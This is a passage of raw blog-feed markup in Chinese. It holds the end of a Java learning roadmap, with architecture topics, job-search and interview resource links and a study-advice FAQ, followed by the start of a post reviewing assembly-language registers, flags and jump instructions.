Stack</li><li>Loki</li></ul></li><li>分布式搜索引擎<ul><li>Elasticsearch</li></ul></li><li>分布式链路追踪<ul><li>Apache SkyWalking</li></ul></li><li>分布式配置中心<ul><li>Apollo</li><li>Nacos</li></ul></li></ul><h4 id="🌗-高可用"><a href="#🌗-高可用" class="headerlink" title="🌗 高可用"></a>🌗 高可用</h4><ul><li>限流</li><li>降级熔断</li><li>冷备</li><li>双机热备</li><li>同城双活</li><li>异地双活</li><li>异地多活</li><li>容灾备份</li></ul><h4 id="🌗-高并发"><a href="#🌗-高并发" class="headerlink" title="🌗 高并发"></a>🌗 高并发</h4><ul><li>数据库<ul><li>分库分表<ul><li>MyCat 中间件</li><li>Apache ShardingSphere 中间件</li></ul></li><li>读写分离</li></ul></li><li>缓存<ul><li>缓存雪崩</li><li>缓存击穿</li><li>缓存穿透</li></ul></li><li>负载均衡<ul><li>负载均衡算法</li><li>软硬件负载均衡（2、3、4、7 层）</li></ul></li></ul><h4 id="🌘-服务网格"><a href="#🌘-服务网格" class="headerlink" title="🌘 服务网格"></a>🌘 服务网格</h4><p>服务网格用来描述组成应用程序的微服务网络以及它们之间的交互。服务网格的规模和复杂性不断的增长，它将会变得越来越难以理解和管理，常见的需求包括服务发现、负载均衡、故障恢复、度量和监控等。</p><h5 id="知识-23"><a href="#知识-23" class="headerlink" title="知识"></a>知识</h5><ul><li>Istio<ul><li>流量管理</li><li>安全性</li><li>可观测性</li></ul></li><li>Envoy（开源的边缘和服务代理）</li></ul><h5 id="资源-24"><a href="#资源-24" class="headerlink" title="资源"></a>资源</h5><ul><li>资料大全：<a href="https://www.servicemesher.com/awesome-servicemesh/">https://www.servicemesher.com/awesome-servicemesh/</a></li><li>istio 官方文档：<a href="https://preliminary.istio.io/latest/zh">https://preliminary.istio.io/latest/zh</a></li><li>istio 视频教程：<a href="https://www.bilibili.com/video/BV1Lf4y1x7j8">https://www.bilibili.com/video/BV1Lf4y1x7j8</a></li><li>在线体验 istio：<a href="https://katacoda.com/courses/istio/">https://katacoda.com/courses/istio/</a></li></ul><h4 id="🌘-DDD-领域驱动设计"><a href="#🌘-DDD-领域驱动设计" class="headerlink" title="🌘 DDD 领域驱动设计"></a>🌘 DDD 领域驱动设计</h4><p>将数据、业务流程抽象成容易理解的领域模型，通过用代码实现领域模型，来组成完整的业务系统。</p><h5 id="知识-24"><a href="#知识-24" class="headerlink" title="知识"></a>知识</h5><ul><li>DDD 的优势</li><li>DDD 的适用场景</li><li>DDD 核心概念<ul><li>领域模型分类：失血、贫血、充血、涨血</li><li>子域划分：核心域、通用域、支撑域</li><li>限界上下文</li><li>实体和值对象</li><li>聚合设计</li><li>领域事件</li></ul></li><li>DDD 实践</li></ul><h5 id="资源-25"><a href="#资源-25" class="headerlink" title="资源"></a>资源</h5><ul><li>DDD 入门：<a href="https://juejin.cn/post/7004002483601145863">https://juejin.cn/post/7004002483601145863</a></li><li>DDD 编码实践：<a href="https://juejin.cn/post/6844903903104860174">https://juejin.cn/post/6844903903104860174</a></li><li>DDD 实践教程：<a href="https://www.bilibili.com/video/BV1Y341167Xp">https://www.bilibili.com/video/BV1Y341167Xp</a></li></ul><h4 id="🌘-其他"><a href="#🌘-其他" class="headerlink" title="🌘 其他"></a>🌘 其他</h4><ul><li>Sidecar</li><li>Serverless</li><li>云原生</li></ul><h4 id="学习建议-25"><a href="#学习建议-25" class="headerlink" title="学习建议"></a>学习建议</h4><p>架构设计的学习没有顶点，多看文章，思考每种设计的优缺点和适用场景，有机会的话在企业中实践即可。</p><p>还在学校、或者初入这行的同学切记，千万不要一味地去背诵架构设计的八股文。你可以背，但是这一块的知识只有结合具体的项目才有意义，所以要多做项目去实践设计的合理性，而不是什么设计都咔咔往系统里去怼。比如面试问到分布式事务，能结合自己项目中用分布式事务解决问题的经验去回答最好。</p><h3 id="🌘-其他技术"><a href="#🌘-其他技术" class="headerlink" title="🌘 其他技术"></a>🌘 其他技术</h3><ul><li>热数据探测技术：京东 HotKey</li><li>数据库流水订阅：阿里 Canal</li><li>监控告警</li><li>应用安全</li><li>故障演练</li><li>流量回放</li></ul><h2 id="阶段-7：Java-求职"><a href="#阶段-7：Java-求职" class="headerlink" title="阶段 7：Java 求职"></a>阶段 7：Java 求职</h2><h3 id="目标-6"><a href="#目标-6" class="headerlink" title="目标"></a>目标</h3><p>找到好工作</p><h3 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h3><ol><li>尽早做规划，可以通过大厂招聘官网的岗位描述来了解岗位的要求</li><li>雕琢一份优秀的简历，推荐阅读：<a href="https://mp.weixin.qq.com/s/wfabzdpOPdq89faFFpZ4NA">https://mp.weixin.qq.com/s/wfabzdpOPdq89faFFpZ4NA</a></li><li>多读面经，坚持刷算法</li><li>多参与面试，持续复盘总结</li></ol><h3 id="资源-26"><a href="#资源-26" class="headerlink" title="资源"></a>资源</h3><h4 id="校招岗位"><a href="#校招岗位" class="headerlink" title="校招岗位"></a>校招岗位</h4><ul><li>⭐ 牛客求职校招版：<a href="https://www.nowcoder.com/recommend/campus">https://www.nowcoder.com/recommend/campus</a></li><li>阿里 Java 开发：<a href="https://campus.alibaba.com/position.htm?refno=12699">https://campus.alibaba.com/position.htm?refno=12699</a></li><li>腾讯后台开发：<a href="https://join.qq.com/post_detail.html?pid=1&amp;id=101&amp;tid=2">https://join.qq.com/post_detail.html?pid=1&amp;id=101&amp;tid=2</a></li><li>腾讯全栈开发：<a href="https://join.qq.com/post_detail.html?pid=1&amp;id=137&amp;tid=2">https://join.qq.com/post_detail.html?pid=1&amp;id=137&amp;tid=2</a></li><li>腾讯运营开发：<a href="https://join.qq.com/post_detail.html?pid=1&amp;id=105&amp;tid=2">https://join.qq.com/post_detail.html?pid=1&amp;id=105&amp;tid=2</a></li><li>美团后端开发：<a href="https://campus.meituan.com/jobs?jobFamily=1&amp;jobId=4005&amp;jobType=1&amp;pageNo=2">https://campus.meituan.com/jobs?jobFamily=1&amp;jobId=4005&amp;jobType=1&amp;pageNo=2</a></li><li>华为软件开发：<a href="https://career.huawei.com/reccampportal/portal5/campus-recruitment-detail.html?jobId=176044">https://career.huawei.com/reccampportal/portal5/campus-recruitment-detail.html?jobId=176044</a></li></ul><h4 id="社招岗位"><a href="#社招岗位" class="headerlink" title="社招岗位"></a>社招岗位</h4><ul><li>⭐ 牛客求职社招版：<a href="https://www.nowcoder.com/recommend/fulltime">https://www.nowcoder.com/recommend/fulltime</a></li><li>阿里社招：<a href="https://job.alibaba.com/zhaopin/positionList.htm">https://job.alibaba.com/zhaopin/positionList.htm</a></li><li>腾讯社招：<a href="https://careers.tencent.com/search.html">https://careers.tencent.com/search.html</a></li></ul><h4 id="实习"><a href="#实习" class="headerlink" title="实习"></a>实习</h4><ul><li>⭐ 牛客实习广场：<a href="https://nowpick.nowcoder.com/w/intern/center">https://nowpick.nowcoder.com/w/intern/center</a></li><li>实习僧：<a href="https://www.shixiseng.com/">https://www.shixiseng.com/</a></li></ul><h4 id="内推"><a href="#内推" class="headerlink" title="内推"></a>内推</h4><ul><li>牛客内推：<a href="https://www.nowcoder.com/discuss/referral/index">https://www.nowcoder.com/discuss/referral/index</a></li></ul><h4 id="鱼皮经历"><a href="#鱼皮经历" class="headerlink" title="鱼皮经历"></a>鱼皮经历</h4><ul><li>从 0 开始的编程学习进大厂经历<ul><li>⭐ 我学计算机的四年，共勉：<a href="https://mp.weixin.qq.com/s/Nc7Ee2UyrPg6hGseQUCzeg">https://mp.weixin.qq.com/s/Nc7Ee2UyrPg6hGseQUCzeg</a></li></ul></li><li>实习经历<ul><li><p>⭐ 我的第一份实习：<a href="https://mp.weixin.qq.com/s/SwGiRzyTkCOOCUXfXPR1Pw">https://mp.weixin.qq.com/s/SwGiRzyTkCOOCUXfXPR1Pw</a></p></li><li><p>⭐ 我的第二份实习，字节跳动：<a href="https://mp.weixin.qq.com/s/3q-YIfuZBjPjSnamNwOraw">https://mp.weixin.qq.com/s/3q-YIfuZBjPjSnamNwOraw</a></p></li></ul></li></ul><h4 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h4><ul><li>⭐ 牛客 Java 面试宝典：<a href="https://www.nowcoder.com/tutorial/94">https://www.nowcoder.com/tutorial/94</a></li><li>⭐ JavaGuide：<a href="https://snailclimb.gitee.io/javaguide/#/">https://snailclimb.gitee.io/javaguide/#/</a></li><li>⭐ CS-Notes：<a href="http://www.cyc2018.xyz/">http://www.cyc2018.xyz/</a></li><li>阿里 Java 技术图谱：<a href="https://developer.aliyun.com/graph/java">https://developer.aliyun.com/graph/java</a></li></ul><h4 id="面经"><a href="#面经" class="headerlink" title="面经"></a>面经</h4><ul><li><p>⭐ 牛客面经：<a href="https://www.nowcoder.com/discuss/experience?tagId=639">https://www.nowcoder.com/discuss/experience?tagId=639</a></p></li><li><p>秋招总结&amp;Java心得（双非硕士，已拿11+5家Offer）：<a href="https://www.nowcoder.com/discuss/327041">https://www.nowcoder.com/discuss/327041</a></p></li><li><p>被疫情逼得gap year的完全菜鸡的春招之路。：<a href="https://www.nowcoder.com/discuss/427812">https://www.nowcoder.com/discuss/427812</a></p></li><li><p>谨以此文纪念2019年春招：<a href="https://www.nowcoder.com/discuss/181212">https://www.nowcoder.com/discuss/181212</a></p></li><li><p>2019秋招经验谈：<a href="https://www.nowcoder.com/discuss/122463">https://www.nowcoder.com/discuss/122463</a></p></li><li><p>秋招心得：<a href="https://www.nowcoder.com/discuss/317888">https://www.nowcoder.com/discuss/317888</a></p></li><li><p>非科班本科菜鸡投的337家(Java后台)：<a href="https://www.nowcoder.com/discuss/133333">https://www.nowcoder.com/discuss/133333</a></p></li><li><p>2018 这一年：<a href="https://www.nowcoder.com/discuss/137593">https://www.nowcoder.com/discuss/137593</a></p></li><li><p>双非的秋招，感谢牛客：<a href="https://www.nowcoder.com/discuss/142181">https://www.nowcoder.com/discuss/142181</a></p></li><li><p>二本本科Java上岸(滴滴京东58)2019秋招心得+面经：<a href="https://www.nowcoder.com/discuss/333912">https://www.nowcoder.com/discuss/333912</a></p></li><li><p>碎碎念流水账特别长 of 自己的 Java 秋招：<a href="https://www.nowcoder.com/discuss/354154">https://www.nowcoder.com/discuss/354154</a></p></li><li><p>秋招之路：个人历程以及面经总结：<a href="https://www.nowcoder.com/discuss/344311">https://www.nowcoder.com/discuss/344311</a></p></li><li><p>【秋招面经总结】菜逼的坎坷之路（JAVA后台研发）：<a href="https://www.nowcoder.com/discuss/352030">https://www.nowcoder.com/discuss/352030</a></p></li><li><p>阿里11面+EMC+网易+美团面经：<a href="https://www.nowcoder.com/discuss/105302">https://www.nowcoder.com/discuss/105302</a></p></li><li><p>2018秋招阿里巴巴java笔试试题：<a href="https://www.nowcoder.com/discuss/67379">https://www.nowcoder.com/discuss/67379</a></p></li><li><p>我的秋招经验分享（已拿BAT头条网易）：<a href="https://www.nowcoder.com/discuss/117071">https://www.nowcoder.com/discuss/117071</a></p></li><li><p>20届的阿里 头条 网易  滴滴 百度 小米等Java面经：<a href="https://www.nowcoder.com/discuss/68289">https://www.nowcoder.com/discuss/68289</a></p></li><li><p>拿了5个offer，回馈牛友发一波面经（长文详细）：<a href="https://www.nowcoder.com/discuss/79051">https://www.nowcoder.com/discuss/79051</a></p></li><li><p>【总结】零基础学习一年拿到BAT三家offer：<a href="https://www.nowcoder.com/discuss/188241">https://www.nowcoder.com/discuss/188241</a></p></li><li><p>本科生秋招经验总结帖：<a href="https://www.nowcoder.com/discuss/296586">https://www.nowcoder.com/discuss/296586</a></p></li><li><p>双非渣硕校招总结+Java面经（网易阿里百度等）：<a href="https://www.nowcoder.com/discuss/134850">https://www.nowcoder.com/discuss/134850</a></p></li><li><p>2018秋招笔试科大讯飞java笔试试题：<a href="https://www.nowcoder.com/discuss/67684">https://www.nowcoder.com/discuss/67684</a></p></li><li><p>头条后台研发面经（共三面）：<a href="https://www.nowcoder.com/discuss/94233">https://www.nowcoder.com/discuss/94233</a></p></li><li><p>一点点小经验和几家Java面经：<a href="https://www.nowcoder.com/discuss/138434">https://www.nowcoder.com/discuss/138434</a></p></li><li><p>感谢牛客网！发一波面经！阿里、网易游戏、京东等offer。：<a href="https://www.nowcoder.com/discuss/101712">https://www.nowcoder.com/discuss/101712</a></p></li><li><p>非科班水硕的春招实习总结- Java 后台开发：<a href="https://www.nowcoder.com/discuss/186528">https://www.nowcoder.com/discuss/186528</a></p></li><li><p>十面阿里，七面头条，六个Offer，春招结束：<a href="https://www.nowcoder.com/discuss/80156">https://www.nowcoder.com/discuss/80156</a></p></li><li><p>成功上岸，最后一波回馈：<a href="https://www.nowcoder.com/discuss/176434">https://www.nowcoder.com/discuss/176434</a></p></li><li><p>【Java后台开发面经】阿里|网易|头条|腾讯|华为：<a href="https://www.nowcoder.com/discuss/108655">https://www.nowcoder.com/discuss/108655</a></p></li><li><p>三跨学生的面经（头条、拼多多、华为、vivo）：<a href="https://www.nowcoder.com/discuss/195640">https://www.nowcoder.com/discuss/195640</a></p></li></ul><h4 id="面试题解"><a href="#面试题解" class="headerlink" title="面试题解"></a>面试题解</h4><ul><li>⭐ 2021 最新 Java 笔试、面试题合集：<a href="https://pan.baidu.com/s/1DE4HAu-DS80n7VOaGpU_KQ">https://pan.baidu.com/s/1DE4HAu-DS80n7VOaGpU_KQ</a> （密码：lkw1）</li><li>牛客网 Java开发校招面试考点汇总（附面试题和答案）：<a href="https://www.nowcoder.com/discuss/161991">https://www.nowcoder.com/discuss/161991</a></li><li>50w字+的技术类校招面试题汇总（附答案+考点）：<a href="https://www.nowcoder.com/discuss/164726">https://www.nowcoder.com/discuss/164726</a></li><li>硬件，软件（后端开发，算法，数据分析等）历年企业笔试真题汇总：<a href="https://www.nowcoder.com/discuss/212783">https://www.nowcoder.com/discuss/212783</a></li></ul><h4 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h4><ul><li><p>⭐ 尚硅谷 2021 逆袭版 Java 面试题第三季：<a href="https://www.bilibili.com/video/BV1Hy4y1B78T">https://www.bilibili.com/video/BV1Hy4y1B78T</a></p></li><li><p>⭐ 阿里大佬透彻讲解 Java 面试 500 道必考题：<a href="https://www.bilibili.com/video/BV1yU4y1J7Bb">https://www.bilibili.com/video/BV1yU4y1J7Bb</a></p></li></ul><h2 id="阶段-8：持续学习"><a href="#阶段-8：持续学习" class="headerlink" title="阶段 8：持续学习"></a>阶段 8：持续学习</h2><h3 id="目标-7"><a href="#目标-7" class="headerlink" title="目标"></a>目标</h3><p>持续追求技术的深度和广度，培养自己的 <strong>核心竞争力</strong> 和 <strong>不可替代性</strong> ，学无止境！</p><h3 id="学习建议-26"><a href="#学习建议-26" class="headerlink" title="学习建议"></a>学习建议</h3><p>自主学习，自主搜索教程，多看书，多阅读技术博客，多实践。</p><h3 id="学习方向"><a href="#学习方向" class="headerlink" title="学习方向"></a>学习方向</h3><h4 id="框架源码"><a href="#框架源码" class="headerlink" title="框架源码"></a>框架源码</h4><ul><li>Spring</li><li>SpringBoot</li><li>SpringMVC</li><li>MyBatis</li><li>Netty</li><li>Dubbo</li><li>SpringCloud</li></ul><h4 id="计算机原理"><a href="#计算机原理" class="headerlink" title="计算机原理"></a>计算机原理</h4><ul><li>《算法导论》：<a href="https://www.bilibili.com/video/av48922404">https://www.bilibili.com/video/av48922404</a></li><li>《现代操作系统》：<a href="https://www.bilibili.com/video/av9555596">https://www.bilibili.com/video/av9555596</a></li><li>《深入理解计算机系统》：<a href="https://www.bilibili.com/video/av31289365">https://www.bilibili.com/video/av31289365</a></li><li>《编译原理》： <a href="https://www.bilibili.com/video/av17649289">https://www.bilibili.com/video/av17649289</a></li><li>《计算机网络：自顶向下方法》：<a href="https://www.bilibili.com/video/BV1JV411t7ow">https://www.bilibili.com/video/BV1JV411t7ow</a></li><li>《计算机程序的构造和解释》：<a href="https://www.bilibili.com/video/av8515129">https://www.bilibili.com/video/av8515129</a></li><li>《数据库系统概论》：<a href="https://www.bilibili.com/video/BV1G54y1d7ZK">https://www.bilibili.com/video/BV1G54y1d7ZK</a></li></ul><h4 id="数据库-x2F-中间件-x2F-分布式"><a href="#数据库-x2F-中间件-x2F-分布式" class="headerlink" title="数据库 &#x2F; 中间件 &#x2F; 分布式"></a>数据库 &#x2F; 中间件 &#x2F; 分布式</h4><ul><li>数据库<ul><li>MySQL</li><li>PostgreSQL</li></ul></li><li>缓存<ul><li>Redis</li></ul></li><li>队列<ul><li>Apache Kafka</li><li>Apache Pulsar</li></ul></li><li>搜索引擎<ul><li>Elastic Stack<ul><li>Elasticsearch</li><li>logstash</li><li>kibana</li><li>beats</li></ul></li></ul></li><li>容器<ul><li>Docker</li><li>K8S</li></ul></li></ul><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><ul><li>广告系统</li><li>电商系统</li><li>搜索系统</li><li>支付转账</li><li>游戏后台</li><li>即时通讯</li><li>社交系统</li><li>CMS 系统</li><li>ERP 系统</li><li>OA 系统</li><li>代码生成</li><li>权限管理</li><li>秒杀活动</li></ul><h4 id="架构设计-1"><a href="#架构设计-1" class="headerlink" title="架构设计"></a>架构设计</h4><p>同阶段 6 架构设计部分</p><h4 id="大数据"><a href="#大数据" class="headerlink" title="大数据"></a>大数据</h4><ul><li>5V 特点</li><li>Hadoop</li><li>HDFS</li><li>MapReduce</li><li>Spark</li><li>Flink</li><li>Storm</li><li>Hive</li><li>HBase</li><li>Druid</li><li>Kylin</li><li>Pig</li><li>Mahout</li></ul><h4 id="前沿技术"><a href="#前沿技术" class="headerlink" title="前沿技术"></a>前沿技术</h4><ul><li>云原生：<a href="https://www.jianshu.com/p/a37baa7c3eff">https://www.jianshu.com/p/a37baa7c3eff</a><ul><li>Quasar Framework：<a href="http://www.quasarchs.com/">http://www.quasarchs.com/</a></li></ul></li><li>服务网格：<a href="https://www.redhat.com/zh/topics/microservices/what-is-a-service-mesh">https://www.redhat.com/zh/topics/microservices/what-is-a-service-mesh</a><ul><li>istio：<a href="https://github.com/istio/istio">https://github.com/istio/istio</a></li></ul></li><li>GraalVM：<a href="https://juejin.cn/post/6850418120570437646">https://juejin.cn/post/6850418120570437646</a> （高性能的通用虚拟机）<ul><li>官网：<a href="https://www.graalvm.org/">https://www.graalvm.org/</a></li></ul></li><li>ZGC：<a href="https://juejin.cn/post/6859276583656980493">https://juejin.cn/post/6859276583656980493</a> （新一代垃圾回收器）<ul><li>官网：<a href="http://openjdk.java.net/projects/zgc/">http://openjdk.java.net/projects/zgc/</a></li></ul></li></ul><h3 id="自学-Java-专题资源"><a href="#自学-Java-专题资源" class="headerlink" title="自学 Java 专题资源"></a>自学 Java 专题资源</h3><ul><li>⭐ GitHub Java 专区：<a href="https://github.com/topics/java">https://github.com/topics/java</a></li><li>⭐ GitHub Java 合集：<a href="https://github.com/akullpp/awesome-java">https://github.com/akullpp/awesome-java</a></li><li>StackOverflow：<a href="https://stackoverflow.com/questions/tagged/java">https://stackoverflow.com/questions/tagged/java</a> （解决问题必备）</li><li>⭐ 掘金 Java 专区：<a href="https://juejin.cn/tag/Java">https://juejin.cn/tag/Java</a></li><li>美团技术团队：<a href="https://tech.meituan.com/">https://tech.meituan.com/</a></li><li>阿里技术团队：<a href="https://102.alibaba.com/tech/list/">https://102.alibaba.com/tech/list/</a></li><li>有赞技术团队：<a href="https://tech.youzan.com/tag/back-end/">https://tech.youzan.com/tag/back-end/</a></li></ul><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="程序员重要能力"><a href="#程序员重要能力" class="headerlink" title="程序员重要能力"></a>程序员重要能力</h3><p>想成为大佬，就是要通过学习和积累，提升自己的各方面能力，比较抽象，共勉！</p><ol><li><p>团队协作能力</p></li><li><p>高效沟通能力</p></li><li><p>需求分析能力</p></li><li><p>架构设计能力</p></li><li><p>抽象复用能力</p></li><li><p>独立创造能力</p></li><li><p>问题解决能力</p></li><li><p>归纳总结能力</p></li><li><p>自主学习能力</p></li><li><p>工具利用能力</p></li><li><p>高效编码能力</p></li><li><p>信息检索能力</p></li><li><p>开源建设能力</p></li><li><p>源码阅读能力</p></li><li><p>自测审查能力</p></li><li><p>文档编写能力</p></li><li><p>知识表达能力</p></li><li><p>绘图描述能力</p></li><li><p>兴趣驱动（长期学习能力）</p></li><li><p>保持好奇心</p></li><li><p>其他（狗头）</p><ul><li><p>复制粘贴能力</p></li><li><p>打架能力</p></li><li><p>PPT 制作能力</p></li></ul></li></ol><h3 id="编程误区"><a href="#编程误区" class="headerlink" title="编程误区"></a>编程误区</h3><ol><li>我不适合学编程？❌（兴趣比天赋更重要，不要怀疑自己）</li><li>忽视基础，急于求成 ❌（勿以浮沙筑高台）</li><li>数学、英语差，就学不好编程 ❌（开发工作基本不用高等数学，英语可以使用翻译软件、工作中提升）</li><li>编程时，刻意记忆代码 ❌（知道每行代码的意义，能看文档写出来就行）</li><li>每行代码都要追求完美 ❌（何为完美？每个人的定义不同）</li><li>用百度搜索、复制粘贴的都是菜鸡程序员 ❌（艹）</li><li>我做的项目太小了，就不整理了 ❌（自己的每个项目都要整理，可以记录自己的成长）</li><li>跟别人交流很麻烦，我更愿意自己写代码 ❌（1 + 1 &gt; 2，切勿闭门造车，不过也要找到合适的同学去交流）</li><li>做别人做过的项目没有意义 ❌（连别人做过的项目都做不出，还想造新轮子？）</li><li>遇到 Bug，想办法绕过而不是寻找解决方案 ❌（Bug 最能使人成长）</li><li>遇到问题，第一时间去问别人而非自己解决 ❌（建议阅读《提问的智慧》）</li><li>花了很多时间、看了很多书，就能学好编程 ❌（编程最忌讳纸上谈兵）</li><li>只向前学习，不整理学过的知识 ❌（建议每学完一个知识，都去回想、总结、写心得，这个时间的花费是值得的）</li><li>单元测试不重要 ❌（一棍打死）</li><li>写文档不重要 ❌（一棍打死）</li><li>和我无关的工作，就不需要了解 ❌（了解团队、同行是很重要的，全局视野）</li><li>收藏的资源从来不看，就不收藏了 ❌（万一以后用到了呢？）</li><li>不去考虑需求的价值，而是一味寻求解决方案 ❌（不要成为需求机器，要有自己的独立思考）</li></ol><h3 id="高效法则"><a href="#高效法则" class="headerlink" title="高效法则"></a>高效法则</h3><ol><li>不要过分追求完美，完成比完美更重要。</li><li>有现成的代码，就不要自己写，避免重复劳动（学习除外）。</li><li>学会使用软件及快捷键来提升自己的编码效率。</li><li>做项目前，要先想清楚怎么做，做好充分的预研和设计。这样不仅便于后续的程序扩展，也能避免无意义的返工。</li><li>将大的目标进行拆解，做好计划，分清主次。不要因为觉得目标遥不可及而拖延，也不要盲目乐观而松懈。</li><li>养成好的作息习惯，找到自己适合工作的黄金时间。</li><li>记性不好，就多记录、多总结、定期复习。哪怕实在记不住，也可以借助文档、收藏夹软件来当自己的第二大脑。</li><li>积累属于自己的工具库，配合搜索软件实现随用随取。</li><li>多和其他同行交流或订阅技术推送，拓宽知识渠道，从而了解更多的工具和方法。有些东西你只要听说过，要用时也许就能节省大量查找时间。</li><li>找到让自己进入专注做事的状态的方法，比如戴上耳机、嚼口香糖等。</li><li>做事高效，离不开经验的积累，因此要多写代码、多做项目。</li></ol><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><ol><li><p>按照这份路线学习，每天要学多少个小时，总共要学多久？</p><p>回答：每个人学习能力不同，当然没有固定标准。我当时平均每天可以学习 6 个小时，寒暑假能保证 8 小时以上的学习，路线中的时长是我当时学习时长 * 1.5 倍的参考值。实话说，我的学习效率真的不高，对编程感兴趣，多学就好了。与其纠结这个时长，倒不妨多抽点时间，每天多学一点。</p></li><li><p>这份路线上推荐的资源，鱼皮都看完了么？</p><p>回答：我是特么神仙啊？怎么可能都看完了！这份路线的本质是以网上现有的、死板的 Java 大学习框架为基础，结合我自己实际学习的知识、经验和感悟给它注入灵魂，从而希望给大家带来更大的帮助和价值。路线中的资源都是利用我自己的资源检索能力和渠道，通过试看、反复对比和参考评价精选出来的，不是主观臆断、空穴来风。</p></li><li><p>我学到这份路线的哪个位置，可以找工作？</p><p>回答：这和你自己的领悟能力和教育背景有关。夸张点说，有些清华大学的同学，可能之前都没学过 Java，照样能找到大厂 Java 开发工作。学到同一阶段的同学，学习过程中的认真程度、积累总结数、做项目个数、基础学习的好坏不同，找到的工作肯定也不同。但一般情况下，想要进大厂，建议至少学完阶段 4 的微服务部分，然后去做一个完整的项目，用上之前学习的技术；不想进大厂的同学，学完第 3 阶段后，学下缓存和队列，一般也能找到 Java 开发的工作。</p></li><li><p>学完这份路线就能进大厂么？</p><p>回答：你先学完，再问这个问题。没有绝对进大厂的保证，但是相信我，把这份路线上的大部分知识学了，再做做项目，哪怕进不了大厂，你拿到的薪水也绝对比松散学习的同学高！</p></li><li><p>我可以相信你么？</p><p>回答：不要相信我，应该相信你自己。想进大厂，就不要怀疑自己的能力！</p></li></ol><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>觉得看文字累的朋友，欢迎看下视频版，带大家导读一下：<a href="https://www.bilibili.com/video/BV1Qf4y1K7ff/">https://www.bilibili.com/video/BV1Qf4y1K7ff/</a></p><p>以上就是鱼皮熬了几天大夜、结合个人经验、并且参考了大量网上的文章和评论总结而成的学习路线，真的是非常不容易，如果大家觉得满意请务必 <strong>三连</strong> 支持下。</p><p>我是鱼皮，持续分享编程干货的程序员，欢迎关注，下期再见~</p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言基础知识复习</title>
      <link href="/post/1a09ef0b.html"/>
      <url>/post/1a09ef0b.html</url>
      
        <content type="html"><![CDATA[<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><ul><li>32位:EAX EBX ECX EDX ESI EDI</li><li>64位:RAX RBX RCX RDX RSI RDI R8-R15</li><li>16位: AX BX CX DX SI DI (还可继续细分位高八位和第八位,例如AX还可分为AH和AL)</li></ul><h2 id="段寄存器和指针变址寄存器"><a href="#段寄存器和指针变址寄存器" class="headerlink" title="段寄存器和指针变址寄存器"></a>段寄存器和指针变址寄存器</h2><p>(前面加上R就是64位,加上E就是32位,这里先省略了)</p><ul><li><p><strong>代码段寄存器CS, 指令指针寄存器IP</strong></p><p>CPU默认将<code>CS:IP</code>指向的内容作为指令来执行,加载一个程序时,<code>CS:IP</code>自动指向程序的入口处</p><p>在读取完一条指令后,IP的值会自动增加,准备读取下一条指令</p><p><code>mov</code>指令不能直接用于修改<code>cs:ip</code>的值. 因而<code>mov cs 0001H</code>这种指令是不被允许的</p><p>可以通过<code>jmp</code>指令来实现对<code>cs:ip</code>的修改,例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jmp x:y   # 将cs的值修改为x,ip的值修改为y,接下来将读取x:y处存放的指令</span><br><span class="line">jmp ax    # 将ax中的值给ip,cs不变</span><br></pre></td></tr></table></figure></li><li><p><strong>数据段寄存器DS和指示数据地址的<code>[address]</code></strong></p><p><strong>这里<code>[address]</code>相当于去<code>address</code>这个地址的位置去取数据,相当于c语言中的<code>*</code></strong> 当设置好了<code>DS</code>的值后,直接通过<code>[x]</code>就可以取到<code>ds:[x]</code>这个位置的值,例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bx,1000H</span><br><span class="line">mov ds,bx</span><br><span class="line">mov al,[0] 这里就相当于将 从ds:[0]处取一个字节(8位)存入al</span><br></pre></td></tr></table></figure></li><li><p><strong>栈段寄存器SS和栈顶指针寄存器SP,以及栈底指针寄存器BP</strong></p><p><code>ss:sp</code>指向栈顶(<code>PUSH</code>入栈时,<code>sp</code>值减小,栈顶上移;<code>POP</code>出栈时,<code>sp</code>值增大,栈顶下移)(<strong>栈是从高地址向低地址增长</strong>)</p><p><code>ss:bp</code>指向<strong>当前函数栈帧</strong>的底部</p></li><li><p>此外段寄存器还有ES,FS,GS等,用到了再补充</p></li></ul><h1 id="标志位寄存器"><a href="#标志位寄存器" class="headerlink" title="标志位寄存器"></a>标志位寄存器</h1><img src="../images/assembly/1.png" alt="image-20221029235632526" style="zoom: 50%;" /><ul><li><p>ZF：执行结果是否为0（1为是，0为否）</p></li><li><p>PF：执行的二进制结果中1的个数是否为偶数(奇偶校验标识)</p></li><li><p>SF：进行有符号运算时，执行结果是否为负（补码机制）</p></li><li><p>CF：进行无符号运算时，是否需要进位（结果超出寄存器范围）或者借位（结果小于0）</p></li><li><p>AF : 辅助进位标识, 运算结果第三位进位时置1</p></li><li><p>OF: 溢出标识, 进行有符号运算时，有无溢出（溢出会导致运算结果不正确）</p></li></ul><h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><ul><li>有条件跳转:(根据特定标志位的值来决定是否跳转)</li></ul><table><thead><tr><th>指令和说明</th><th><code>cmp a,b</code>的结果</th><th>标志位条件</th></tr></thead><tbody><tr><td>jz&#x2F;je 为零则跳转</td><td>a&#x3D;b</td><td>ZF&#x3D;1</td></tr><tr><td>jnz&#x2F;jne 不为零则跳转</td><td>a!&#x3D;b</td><td>ZF&#x3D;0</td></tr><tr><td>jc 进位则跳转</td><td></td><td>CF&#x3D;1</td></tr><tr><td>jnc 不进位则跳转</td><td></td><td>CF&#x3D;0</td></tr><tr><td>jo 溢出则跳转</td><td></td><td>OF&#x3D;1</td></tr><tr><td>jon 